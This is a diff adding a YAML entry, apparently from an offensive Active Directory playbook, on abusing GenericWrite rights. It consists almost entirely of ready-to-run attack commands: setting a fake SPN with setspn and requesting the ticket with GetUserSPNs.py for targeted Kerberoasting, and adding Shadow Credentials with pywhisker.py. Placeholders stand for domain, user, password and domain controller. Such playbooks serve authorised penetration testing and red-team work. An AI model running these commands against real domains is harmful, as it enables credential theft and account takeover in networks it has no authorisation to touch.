@@ -1,0 +1,11 @@
+name: GenericWrite
+description: Write to non-protected attributes - can set SPN or script path
+commands:
+- '# Targeted Kerberoasting (set SPN on user)'
+- setspn -a HTTP/fakeserver.domain.local <TARGET_USER>
+- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+- ''
+- '# Shadow Credentials (if AD CS is present)'
+- pywhisker.py -d '<DOMAIN>' -u '<YOUR_USER>' -p '<PASSWORD>' --target '<TARGET>' --action add
+opsec: []
+references: []
